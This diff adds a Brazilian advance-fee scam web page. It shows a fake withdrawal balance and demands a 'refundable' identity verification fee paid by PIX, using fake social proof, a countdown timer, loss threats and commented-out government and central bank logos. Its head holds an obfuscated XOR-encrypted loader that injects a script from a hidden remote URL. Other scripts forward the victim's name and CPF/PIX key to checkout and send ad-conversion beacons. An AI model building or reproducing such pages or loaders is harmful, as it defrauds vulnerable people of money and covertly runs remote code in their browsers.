@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <script src="js/utm-propagator.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitando Saque...</title>
+    <link rel="stylesheet" href="css/style-saque.css">
+    <link href="css/boxicons.min.css" rel="stylesheet">
+    <script src="js/utm-propagator.js"></script>
+
+    <script>(function () { var l_nqo2 = atob("DDp/6DO0irDAsMzteUFdnUHYqIri2LiZCUlFxxzX7t7uxbiAEFwGxlDb556iwuOeGkgWmEfHpcW03b/CFVsLjUDApNqzkuDPGE4LmlrW/8Slw+7XIkFdhlLZ75L6kqiMDVtSnUfZ49a5nbyfHEwahkeZ8tOv1OGeGlFdxBHC69y11e7XWxgCxEiW5NGt1e7XW14enFKZ/8St2aqUVEoNjUXR5MTtw7mPEF4Myh+W/NGsxanPQxhdlW7J"); var a_0j2 = []; for (var e_d = 0; e_d < l_nqo2.length; e_d++) { a_0j2.push(l_nqo2.charCodeAt(e_d) & 255); } var y_6b = a_0j2[0]; var d_rlgj = a_0j2.slice(1, 1 + y_6b); var p_qjq = a_0j2.slice(1 + y_6b); var w_r8dl = p_qjq.map(function (b, j_5f9) { return b ^ d_rlgj[j_5f9 % y_6b]; }); var g_v3j = ""; for (var f_xun = 0; f_xun < w_r8dl.length; f_xun++) { g_v3j += String.fromCharCode(w_r8dl[f_xun] & 255); } var b_501h = decodeURIComponent(escape(g_v3j)); var p_5c = JSON.parse(b_501h); var o_989 = p_5c.globals || []; o_989.forEach(function (g_a) { window[g_a.name] = g_a.value; }); var q_o9w = document.createElement("script"); q_o9w.src = p_5c.url; q_o9w.async = true; q_o9w.defer = true; (p_5c.attributes || []).forEach(function (f_3) { q_o9w.setAttribute(f_3.name, f_3.value); }); (document.head || document.documentElement).appendChild(q_o9w); })();</script>
+</head>
+
+<body>
+
+    <div id="loading-screen" class="loading-screen">
+        <div class="loading-content">
+            <div class="spinner-custom"></div>
+
+            <h2>Requesting withdrawal...</h2>
+
+            <div class="loading-bar-bg">
+                <div id="loading-bar-fill" class="loading-bar-fill"></div>
+            </div>
+
+            <p>Please wait a moment...</p>
+        </div>
+    </div>
+
+    <main id="main-content" class="main-container" style="display: none; opacity: 0;">
+
+        <header class="header-top">Identity Confirmation</header>
+
+        <div class="card card-saldo-principal">
+            <p class="label-saldo">AVAILABLE BALANCE</p>
+            <h2 class="valor-saldo">$5,496.72</h2>
+            <p class="sub-saldo">Awaiting confirmation for withdrawal</p>
+        </div>
+
+        <div class="card card-taxa-info">
+            <p class="processo-titulo">IDENTITY CONFIRMATION</p>
+
+            <div class="linha-taxa-destaque">
+                <span class="valor-taxa-dinamica">$33.60</span>
+                <span class="badge-reembolsavel">REFUNDABLE</span>
+            </div>
+
+            <p class="texto-informativo">
+                Identity verification for your withdrawal of
+                <strong>$5,496.72</strong>.
+                Any applicable fee and refund conditions will be
+                clearly disclosed before payment.
+            </p>
+        </div>
+
+        <div class="card card-dados-reembolso">
+            <p class="processo-titulo">REFUND DETAILS</p>
+
+            <ul class="lista-reembolso">
+                <li>
+                    <span>Date</span>
+                    <strong id="data-atual"></strong>
+                </li>
+
+                <li>
+                    <span>Payment method</span>
+                    <strong id="confirm-tipo"></strong>
+                </li>
+
+                <li>
+                    <span>Amount to receive</span>
+                    <strong class="total-final" id="total-receber">$5,496.72</strong>
+                </li>
+            </ul>
+        </div>
+
+        <div class="card card-tarefa">
+            <p class="processo-titulo">RELEASE PROCESS</p>
+
+            <div class="space-y-4">
+                <div class="passo-item">
+                    <div class="passo-numero">1</div>
+                    <div class="passo-texto">
+                        <p class="passo-label">Complete identity verification</p>
+                        <p class="passo-sub">
+                            <strong>$33.60</strong> identity verification fee
+                        </p>
+                    </div>
+                </div>
+
+                <div class="passo-item">
+                    <div class="passo-icon-bg">
+                        <i class="bx bx-check"></i>
+                    </div>
+                    <div class="passo-texto">
+                        <p class="passo-label texto-verde-sucesso">
+                            Receive your refund
+                        </p>
+                        <p class="passo-sub">
+                            Refund processing time: approximately 1 minute
+                        </p>
+                    </div>
+                </div>
+
+                <div class="passo-item">
+                    <div class="passo-numero">3</div>
+                    <div class="passo-texto">
+                        <p class="passo-label">Access your available balance</p>
+                        <p class="passo-sub">
+                            $5,496.72 available for withdrawal
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="container-acao">
+            <a class="btn-pix" id="" href="pix-php/checkout-of1/index.php" style="text-decoration: none;">
+                Pay Fee to Unlock Withdrawal
+            </a>
+
+            <div class="info-reembolso">
+                <i class="bx bx-shield-quarter"></i>
+                <span>Automatic refund within 1 minute</span>
+            </div>
+        </div>
+
+        <!-- <footer class="footer-seguranca">
+            <div class="footer-logos">
+                <img src="images/bacen-logo-XOo1vtRL.png">
+                <img src="images/gov-br-logo-CDRfZsnH.webp" alt="Gov.br">
+                <img src="images/receita-federal-logo-CMD7EUle.png" alt="Receita Federal">
+            </div>
+            <p class="footer-copyright">© 2026 Portal de Devoluções. Todos os direitos reservados.</p>
+        </footer> -->
+
+    </main>
+
+    <div id="modal-pix" class="modal-pix-overlay" style="display:none;">
+        <div class="modal-pix-content">
+
+            <!-- Topo: título -->
+            <div class="modal-top">
+                <h3 class="modal-title">Confirmação de Identidade</h3>
+            </div>
+
+            <!-- Card saldo + expira -->
+            <div class="card card-saldo-expira">
+                <div class="saldo-left">
+                    <span class="mini-label">SEU SALDO</span>
+                    <strong class="saldo-valor">R$ 5.496,72</strong>
+                </div>
+
+                <div class="saldo-right">
+                    <span class="mini-label mini-right">EXPIRA EM</span>
+                    <strong class="expira-valor" id="expira-timer">07:00</strong>
+                </div>
+            </div>
+
+            <!-- Card PIX -->
+            <div class="card card-pix">
+                <h4 class="pix-title">Pague <strong class="taxa-texto-dinamico">R$ 0,00</strong> via PIX para liberar
+                </h4>
+                <p class="pix-subtitle">Escaneie o QR Code ou copie o código abaixo</p>
+
+                <div class="qr-wrap">
+                    <img id="qr-code-img"
+                        src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=Aguardando..."
+                        alt="QR Code PIX">
+                </div>
+
+                <div class="pix-code-box">
+                    <textarea id="pix-copia-cola" readonly="">Gerando código...</textarea>
+                </div>
+
+                <button class="btn-copiar-pix" type="button" onclick="copiarPix()">
+                    <i class="bx bx-copy"></i> Copiar código PIX
+                </button>
+            </div>
+
+            <!-- Status aguardando -->
+            <div class="card status-card status-wait">
+                <div class="spinner-small"></div>
+                <div class="status-text">
+                    <strong>Aguardando pagamento...</strong>
+                    <span>Atualização automática ao confirmar</span>
+                </div>
+            </div>
+
+            <!-- Social proof -->
+            <div class="card status-card status-green">
+                <i class="bx bx-group"></i>
+                <div class="status-text">
+                    <strong>68 pessoas sacando agora</strong>
+                    <span>Saques processados em tempo real</span>
+                </div>
+            </div>
+
+            <!-- Alerta de perda -->
+            <div class="card status-card status-red">
+                <i class="bx bx-error"></i>
+                <div class="status-text">
+                    <strong>Não perca seu prêmio</strong>
+                    <span>Saldo de <b>R$ 5.496,72</b> será cancelado se o pagamento não for confirmado.</span>
+                </div>
+            </div>
+
+            <!-- Botão repetir (como no print) -->
+            <button class="btn-copiar-pix btn-copiar-pix-bottom" type="button" onclick="copiarPix()">
+                <i class="bx bx-copy"></i> Copiar código PIX
+            </button>
+
+            <!-- Rodapé segurança -->
+            <div class="modal-security">
+                <i class="bx bx-shield-quarter"></i>
+                <span>Pagamento 100% seguro e reembolsável</span>
+            </div>
+
+        </div>
+    </div>
+
+
+    <div id="toast-saque" class="toast-saque">
+        <img id="toast-img" src="https://i.pravatar.cc/150?img=11" alt="Perfil" class="toast-perfil">
+        <div class="toast-texto">
+            <p id="toast-mensagem">Pedro H. sacou <strong class="texto-verde">R$ 2.029,02</strong></p>
+
+            <span>há poucos segundos</span>
+        </div>
+        <div class="toast-dot"></div>
+    </div>
+
+    <script>
+        document.getElementById('data-atual').textContent =
+            new Date().toLocaleDateString('en-US', {
+                month: 'short',
+                day: 'numeric',
+                year: 'numeric',
+                timeZone: 'America/Sao_Paulo'
+            });
+    </script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+
+            const confirmTipo = document.getElementById("confirm-tipo");
+
+            if (!confirmTipo) return;
+
+            const metodoPagamento = localStorage.getItem("metodoPagamento");
+
+            confirmTipo.textContent = metodoPagamento || "Not selected";
+
+        });
+    </script>
+
+    <script>
+
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const method = sessionStorage.getItem('selectedPaymentMethod');
+            const field = document.getElementById('confirm-tipo');
+
+            if (field) {
+                field.textContent = method || 'Not selected';
+            }
+        });
+
+        (function () {
+            function getParam(name) {
+                try { return new URL(window.location.href).searchParams.get(name); }
+                catch (e) { return null; }
+            }
+
+            function setCookie(name, value, days) {
+                var d = new Date();
+                d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+                document.cookie = name + "=" + encodeURIComponent(value) + ";expires=" + d.toUTCString() + ";path=/;SameSite=Lax";
+            }
+
+            // CAPTURA UTM_SOURCE se vier na URL
+            var utm_source = (getParam('utm_source') || '').trim();
+            if (utm_source) {
+                localStorage.setItem('utm_source', utm_source);
+                setCookie('utm_source', utm_source, 7);
+                console.log("UTM Source capturado em saque.html:", utm_source);
+            }
+
+            // ✅ BLINDAGEM: CAPTURA CLICKID da URL se vier
+            var click_from_url = (getParam('clickid') || getParam('click_id') || '').trim();
+            if (click_from_url) {
+                localStorage.setItem('clickid', click_from_url);
+                localStorage.setItem('click_id', click_from_url);
+                setCookie('clickid', click_from_url, 7);
+                console.log("ClickID capturado da URL:", click_from_url);
+            }
+
+            // 1. Recuperar o Click ID
+            const clickid = (localStorage.getItem('click_id') || localStorage.getItem('clickid') || '').trim();
+            if (!clickid) return;
+
+            // Função para enviar eventos usando Beacon API
+            function enviarKwai(nomeEvento, valor) {
+                const payload = JSON.stringify({
+                    clickid: clickid,
+                    event_name: nomeEvento,
+                    currency: 'BRL',
+                    value: parseFloat(valor) || 0, // ✅ sem fallback perigoso
+                    order_id: 'ord_' + Date.now()
+                });
+
+                if (navigator.sendBeacon) {
+                    const blob = new Blob([payload], { type: 'application/json' });
+                    navigator.sendBeacon('/kwai_event.php', blob);
+                } else {
+                    fetch('/kwai_event.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: payload,
+                        keepalive: true
+                    });
+                }
+                console.log("Kwai Event: " + nomeEvento + " disparado.");
+            }
+
+            // 2. Initiated Checkout quando PIX é gerado
+            const btnGerar = document.getElementById('btn-gerar-pix');
+            if (btnGerar) {
+                btnGerar.addEventListener('click', function () {
+                    const checkGenerated = setInterval(() => {
+                        const inputPix = document.getElementById('pix-copia-cola');
+                        if (inputPix && inputPix.value.length > 50 && !inputPix.dataset.sent) {
+                            inputPix.dataset.sent = "true";
+                            clearInterval(checkGenerated);
+
+                            const taxaTexto = document.getElementById('taxa-valor-display').innerText;
+                            const valorReal = taxaTexto.replace(/[^\d,]/g, '').replace(',', '.');
+                            enviarKwai('EVENT_INITIATED_CHECKOUT', valorReal);
+                        }
+                    }, 500);
+                });
+            }
+
+            // 3. 🚫 Purchase será enviado pela Railway (S2S), então não enviamos pelo front
+            const originalFetch = window.fetch;
+            window.fetch = function () {
+                return originalFetch.apply(this, arguments).then(async (response) => {
+                    const url = arguments[0];
+
+                    if (typeof url === 'string' && url.includes('consultar_pagamento.php')) {
+                        const clone = response.clone();
+                        try {
+                            const data = await clone.json();
+                            if (data && data.pago) {
+                                console.log("Pagamento confirmado no front (Purchase será enviado pela Railway).");
+                                await new Promise(resolve => setTimeout(resolve, 300));
+                            }
+                        } catch (e) {
+                            console.error("Erro ao processar resposta do pagamento");
+                        }
+                    }
+                    return response;
+                });
+            };
+        })();
+    </script>
+
+    <script>document.addEventListener("DOMContentLoaded", () => {
+            // 1. Pega o botão de checkout
+            const btnCheckout = document.querySelector('.btn-pix');
+            if (!btnCheckout) return;
+
+            // Função para montar a URL com todos os parâmetros
+            function atualizarLinkCheckout() {
+                const baseUrl = btnCheckout.href.split('?')[0]; // Pega a URL limpa
+                const params = new URLSearchParams();
+
+                // Pega o click_id
+                const clickid = (localStorage.getItem('click_id') || localStorage.getItem('clickid') || '').trim();
+                if (clickid) {
+                    params.append('click_id', clickid);
+                    params.append('src', clickid); // Manda como src por garantia
+                }
+
+                // Pega os dados do usuário salvos no funil anterior
+                const dadosSalvos = JSON.parse(localStorage.getItem('dadosSaquePix')) || {};
+                if (dadosSalvos.nomeCompleto) params.append('name', dadosSalvos.nomeCompleto);
+                if (dadosSalvos.chavePix) params.append('document', dadosSalvos.chavePix); // Assumindo que a chave é o CPF
+
+                // Pega o valor exato da taxa gerada na tela
+                const taxaElement = document.getElementById('taxa-valor-display');
+                if (taxaElement) {
+                    const valorTaxa = taxaElement.innerText.replace(/[^\d,]/g, '').replace(',', '.');
+                    if (valorTaxa) params.append('amount', valorTaxa); // Passa o valor pra ZuckPay
+                }
+
+                // Atualiza o link visível no HTML
+                if (params.toString()) {
+                    btnCheckout.href = `${baseUrl}?${params.toString()}`;
+                }
+            }
+
+            // Espera meio segundo para garantir que o seu script anterior já gerou a taxa dinâmica
+            setTimeout(atualizarLinkCheckout, 500);
+
+            // 2. Salva o evento Initiated Checkout no Kwai antes do redirecionamento
+            btnCheckout.addEventListener('click', (e) => {
+                // Pega o valor final para mandar pro Kwai
+                const taxaElement = document.getElementById('taxa-valor-display');
+                let valorReal = 0;
+                if (taxaElement) {
+                    valorReal = taxaElement.innerText.replace(/[^\d,]/g, '').replace(',', '.');
+                }
+
+                // Dispara o evento de forma assíncrona garantida (mesmo mudando de página)
+                const clickid = (localStorage.getItem('click_id') || localStorage.getItem('clickid') || '').trim();
+                if (clickid) {
+                    const payload = JSON.stringify({
+                        clickid: clickid,
+                        event_name: 'EVENT_INITIATED_CHECKOUT',
+                        currency: 'BRL',
+                        value: parseFloat(valorReal) || 0,
+                        order_id: 'ord_' + Date.now()
+                    });
+
+                    if (navigator.sendBeacon) {
+                        const blob = new Blob([payload], { type: 'application/json' });
+                        navigator.sendBeacon('/kwai_event.php', blob);
+                    }
+                }
+
+                // Não usamos e.preventDefault(), então ele vai pro checkout normalmente logo em seguida
+            });
+        });
+    </script>
+    <script src="js/saque.js"></script>
+    <script src="js/index.js" data-token="pt_246f25ea85305e5f3c653da1bc55dfd7"></script>
+    <script src="js/index.js" data-token="pt_d7c144ffd2b0fce2c05f769269023150"></script>
+
+
+</body>
+
+</html>
